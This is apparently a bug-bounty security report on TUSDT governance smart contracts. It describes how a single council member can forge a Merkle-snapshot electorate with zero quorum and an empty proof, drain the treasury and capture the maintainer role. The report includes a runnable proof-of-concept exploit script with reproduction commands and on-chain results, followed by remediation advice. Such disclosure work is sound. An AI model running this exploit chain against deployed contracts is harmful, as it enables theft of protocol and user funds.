# Missing snapshot validation in `submit_snapshot` lets a single council member forge the electorate and drain the entire treasury (and capture the maintainer role)

A single member of the 5-member governance council can unilaterally commit a fabricated Merkle-snapshot electorate (arbitrary root + `circulating_supply = 1`), then submit, self-approve with an empty proof, finalize, and execute a Funding proposal that transfers the treasury's balance to themselves. The same forged snapshot also decides the maintainer election, escalating a treasury drain into full protocol capture. Confirmed on-chain via regtest: an attacker with zero legitimate stake moved 400,000,000 TUSDT out of the treasury in one run.

## Brief/Intro

`TusdtGovernance::submit_snapshot` is the single on-chain input that defines *who may vote and with how much power* — for both token-holder funding proposals and the maintainer election — yet it is callable by **any one** of the five council members with **no validation** of the Merkle root or the `circulating_supply` it stores. In production, a single rogue (or compromised) council member can forge an electorate in which they alone hold overwhelming voting power against a quorum they have driven to zero, pass an arbitrary Funding proposal, and have the treasury pay its entire balance out to their own address — with no other council member, maintainer, or token holder able to intervene. Because the same forged snapshot also drives the maintainer election, the attacker can additionally install themselves as maintainer and set an arbitrary emergency oracle price, extending the loss from the treasury to the vault/collateral system.

## Vulnerability Details

The vulnerability is a missing-validation / trust-distribution failure composed of three cooperating weaknesses across `tusdt-governance`, `tusdt-treasury`, and the shared `tusdt-voting` verifier.

**1) `submit_snapshot` accepts an unvalidated, attacker-controlled electorate, gated by a single council member.**

`contracts/tusdt-governance/lib.rs:548`
```rust
#[ink(message)]
pub fn submit_snapshot(
    &mut self,
    root: MerkleHash,
    circulating_supply: u128,
    snapshot_block: u32,
) -> Result<u64> {
    self.ensure_council()?;                 // ANY 1 of 5, no threshold
    let epoch = self.current_epoch.checked_add(1).ok_or(Error::ArithmeticError)?;
    self.snapshots.insert(epoch, &Snapshot { root, circulating_supply, snapshot_block });
    self.current_epoch = epoch;             // root + circulating_supply stored VERBATIM
    ...
}
```
`ensure_council()` passes for any member of the 5-person committee (`contracts/tusdt-governance/lib.rs:879`). The `root` (which fixes the entire electorate and every voter's balance/weight) and `circulating_supply` (the quorum base) are written with no cross-check against real subnet stake, no floor, and no multi-party approval.

**2) `circulating_supply = 1` truncates the turnout quorum to zero.**

`contracts/tusdt-governance/lib.rs:582`
```rust
pub fn quorum(&self, epoch: u64) -> u128 {
    self.snapshots.get(epoch)
        .and_then(|s| s.circulating_supply
            .saturating_mul(u128::from(self.params.quorum_bps))   // quorum_bps = 2000
            .checked_div(u128::from(BPS_DENOMINATOR)))            // /10_000
        .unwrap_or(0)
}
```
With `circulating_supply = 1`: `1 * 2000 / 10_000 = 0` (integer division). `finalize` checks `voted_balance >= quorum` (`contracts/tusdt-governance/lib.rs:803`), which any non-zero vote satisfies.

**3) The Merkle verifier accepts an empty proof against a self-chosen root.**

`voting/src/lib.rs:105`
```rust
pub fn verify_merkle_proof(proof: &[MerkleHash], root: MerkleHash, leaf: MerkleHash) -> bool {
    let mut computed = leaf;
    for sibling in proof { computed = hash_pair(computed, *sibling); }
    computed == root          // proof == [] ⇒ returns (leaf == root)
}
```
`vote` recomputes the leaf from the caller's own supplied values and verifies it against the stored root (`contracts/tusdt-governance/lib.rs:743`):
```rust
let leaf = leaf_hash(coldkey, hotkey, balance, multiplier_bps);
if !verify_merkle_proof(&proof, snapshot.root, leaf) { return Err(Error::InvalidProof); }
let weight = voting_power(balance, multiplier_bps).ok_or(Error::ArithmeticError)?;
```
The attacker sets `root = leaf_hash(self, self_hot, HUGE_BALANCE, 10_000)` in step 1, then votes with those exact values and `proof = []`. `computed == leaf == root`, so the fabricated balance is accepted as a genuine electorate entry. (The leaf preimage is 84 bytes — 2×AccountId + u128 + u32 — so a classical second-preimage forgery is infeasible; the defect is that a single-leaf "tree" where the caller chose the root is never rejected.)

**Putting it together — the full attack chain, entirely by one council member `M`:**

1. `submit_snapshot(root = leaf_hash(M, M_hot, 1_000_000, 10_000), circulating_supply = 1, snapshot_block = 0)` → new epoch `e`, `quorum(e) = 0`.
2. `submit_proposal(cid, ProposalKind::Funding { fund: Emergency, token_kind: Tusdt, amount, recipient: M })` — submission is council-only (`contracts/tusdt-governance/lib.rs:645`), so `M` qualifies; binds to epoch `e`. (Subject only to the day-of-month submission window.)
3. `vote(id, M_hot, true, 1_000_000, 10_000, proof = [])` — verifies because `root == leaf`; adds `voting_power(1_000_000, 10_000)` to `yes` and `1_000_000` to `voted_balance`.
4. `finalize(id)` after the voting window → `voted_balance(1_000_000) >= quorum(0)` and `yes_bps = 10_000 >= approval_bps` ⇒ **Passed** (`contracts/tusdt-governance/lib.rs:784`).
5. `execute(id)` (permissionless) → `treasury.release(Emergency, Tusdt, amount, M)`. Governance holds the treasury's `governance` role, so `ensure_governance()` passes and the treasury pays out (`contracts/tusdt-treasury/lib.rs:204`).

**Escalation to full protocol capture.** The `tusdt-election` contract fetches this same governance snapshot as its electorate (`election/lib.rs:1002`, `gov_latest_snapshot` → `election_snapshot`). The identical forgery lets `M` win the maintainer election; the maintainer can then call `oracle_commit_round` (`contracts/tusdt-governance/lib.rs:491` → `oracle.commit_round_governance`), which bypasses quorum and deviation checks and sets an arbitrary collateral price, directly controlling liquidations and borrow limits across the vault.

## Impact Details

- **Direct loss: the entire treasury balance.** `execute → treasury.release` can pay out up to the full booked balance of any fund, in either `Tusdt` or `Native`, to an attacker-chosen recipient. The treasury books all protocol fees (transaction fees, interest, liquidation fees) across six funds; the Emergency fund alone receives 50% of every distribution (`contracts/tusdt-treasury/lib.rs:16`). Loss is bounded only by the treasury's holdings at the time of the attack; repeated proposals drain every fund.
- **Escalated loss: the collateral/stablecoin system.** Via maintainer capture and an arbitrary emergency oracle price, the attacker can force liquidations of healthy vaults and/or set the collateral price high enough to mint TUSDT far in excess of real collateral value — extending the loss beyond the treasury to the vault's collateral pool and the peg itself (bounded by the borrow cap / turnstile-style caps).
- **Governance capture is permanent-until-fixed.** Once maintainer, the attacker controls council seating, vault risk params, the oracle validator, and the emergency price — there is no higher authority to reverse it on-chain.

Selected impact: **theft / direct loss of user (protocol treasury) funds**, escalating to protocol insolvency and governance takeover. The attack requires a council role, which is a maintainer-appointed committee position; because the 5-member committee exists specifically to prevent unilateral action, a single member achieving total loss is a critical break of the intended trust model rather than expected privileged behavior.

## References

- `contracts/tusdt-governance/lib.rs` — `submit_snapshot` (L548), `quorum` (L582), `vote` (L711/743), `finalize` (L784), `execute` (L835), `submit_proposal` (L639), `oracle_commit_round` (L491), `ensure_council` (L879)
- `contracts/tusdt-treasury/lib.rs` — `release` (L204), fund split constants (L14–28)
- `voting/src/lib.rs` — `verify_merkle_proof` (L105), `leaf_hash` (L78), `voting_power` (L70)
- `contracts/tusdt-election/lib.rs` — `gov_latest_snapshot` (L1002), `cast_approval` (L624)
- PoC script: `tools/scripts/drainExploit.ts`

## Proof of Concept

Runnable PoC deploying `erc20 + treasury + governance (+ election)` to a live `substrate-contracts-node` and executing the full chain with **real cross-contract calls** (`governance.execute → treasury.release → erc20.transfer`). The attacker (Bob) is one of five council members holding zero legitimate stake/voting power.

Observed on-chain result:
```
Attacker (Bob) TUSDT before : 0
Attacker (Bob) TUSDT after  : 400000000
Treasury Emergency before   : 500000000
Treasury Emergency after    : 100000000
Attacker net gain (TUSDT)   : 400000000
proposal status after finalize: "Passed"
✅ CONFIRMED: single council member drained the treasury on-chain.
```

**Reproduce**
```bash
# Toolchain: cargo-contract 5.x needs Rust in [1.85, 1.90); 1.89.0 works.
rustup run 1.89.0 cargo contract build --release --manifest-path contracts/tusdt-erc20/Cargo.toml
rustup run 1.89.0 cargo contract build --release --manifest-path contracts/tusdt-treasury/Cargo.toml
rustup run 1.89.0 cargo contract build --release --manifest-path contracts/tusdt-election/Cargo.toml
rustup run 1.89.0 cargo contract build --release --manifest-path contracts/tusdt-governance/Cargo.toml

substrate-contracts-node --dev --tmp &        # prebuilt: paritytech/substrate-contracts-node v0.42.0
cd tools && yarn install
node --import tsx scripts/drainExploit.ts
```

**Exploit core (`tools/scripts/drainExploit.ts`)** — the forged electorate and empty-proof vote, cast entirely by the attacker council member:
```ts
// leaf_hash = blake2_256(SCALE(coldkey, hotkey, balance:u128, mult:u32)); single-leaf tree => root == leaf
const root = leafHash(bob.address, bob.address, FORGED_BALANCE, MULT_BPS);
await txMessage(api, gov, "submit_snapshot", bob, [u8aToHex(root), 1, 0]);          // circulating_supply = 1 => quorum 0
await txMessage(api, gov, "submit_proposal", bob, ["bafyDRAINPOC",
  { Funding: { fund: "Emergency", tokenKind: "Tusdt", amount: DRAIN_AMOUNT, recipient: bob.address } }]);
await txMessage(api, gov, "vote", bob, [pid, bob.address, true, FORGED_BALANCE, MULT_BPS, []]); // empty proof
// ...advance past voting window...
await txMessage(api, gov, "finalize", bob, [pid]);   // -> "Passed"
await txMessage(api, gov, "execute",  bob, [pid]);   // -> treasury.release -> erc20.transfer to Bob
```

**PoC-only environment shims (none touch the vulnerable authorization path).** The faithful production node is a subtensor/Bittensor localnet (`Balance = u64`, plus the Bittensor chain extension); to run on the *stock* `substrate-contracts-node` the PoC applies three width/compat-only changes, none of which alter the governance logic under test:
- `CustomEnvironment::Balance` widened `u64 → u128` to match the stock node's runtime Balance (the bug is integer-width-independent; stock node otherwise rejects instantiation with `OutputBufferTooSmall`).
- `tusdt-election::read_candidate_stake` stubbed to remove the Bittensor chain-extension import the stock node lacks (`CodeRejected` otherwise). `register_candidate` is not on the drain path; the election is only *instantiated* by governance's constructor here and never called.
- The voting period is shortened via the maintainer's own `update_params`, purely so `finalize` is reachable in-test; production simply waits the standard 7-day window. Funds were seeded as TUSDT minted directly to the treasury (in production the vault mints treasury fees to the same effect).

## Remediation

1. **Require a threshold for `submit_snapshot`** (k-of-n council multisig, or maintainer co-sign) so no single member can commit an electorate.
2. **Anchor / validate the snapshot on-chain**: cross-check `root` and `circulating_supply` against a trusted source (real subnet stake) and reject `circulating_supply` below a sane floor so quorum cannot be zeroed.
3. **Reject trivial proofs**: enforce a minimum proof depth and domain-separate leaf vs. internal-node hashing so a single-leaf tree (`root == leaf`, empty proof) cannot substitute for the real electorate.
4. **Snapshot the pass thresholds** (`quorum_bps`/`approval_bps`) into each `Proposal` at submission, closing the related `update_params`-mid-vote weakness.

---

## Appendix — secondary findings (from parallel per-contract audits; none independently critical)

- **[MEDIUM] Oracle min-submitter-stake 100× too low.** `contracts/tusdt-oracle/lib.rs:18` ships `DEFAULT_MIN_SUBMITTER_STAKE = 10_000_000_000` (1e10) vs. the intended 1e12 (doc-comment + tests). Confirmed by a failing test; lowers the Sybil cost of dominating the ≥3-reporter median by 100×. Shipped by the "finalized mainnet params" commit without running the suite (21 election tests also fail on a stricter, non-exploitable `MIN_CANDIDATE_STAKE` bump).
- **[MEDIUM] Oracle price walk.** A validator (or reporter majority) can commit many rounds per block, each moving the ±10% deviation cap, compounding to an arbitrary price; the median path leaves `was_overridden = false` (no detection flag). (`oracle/lib.rs:277`, `:529`)
- **[LOW] `execute` breaks checks-effects-interactions** (status set after `treasury.release`); not currently reentrant but flip the flag first. (`governance/lib.rs:846`)
- **[LOW] In-flight proposals read live `quorum_bps`/`approval_bps`** — maintainer can retroactively lower the bar via `update_params`. (`governance/lib.rs:803`)
- **[LOW] Treasury native existential-deposit over-booking** strands a small amount and can DoS a native release (not stealable). (`treasury/lib.rs:176`)
- **[LOW] No-bid liquidation auction lock** — a vault whose auction ends with zero bids can't be re-liquidated unless an auction `admin` is configured. (`auction/lib.rs:445`)

**Explicitly ruled out (no unprivileged critical):** only the vault mints TUSDT, gated by controller + collateral ratio + borrow cap; repay and liquidation settlement never inflate supply; auction escrow conserves exactly (single refund, winning bid locked); treasury release authorization is airtight; oracle manipulation is bounded and role-scoped. No unprivileged inflation or theft path was found.
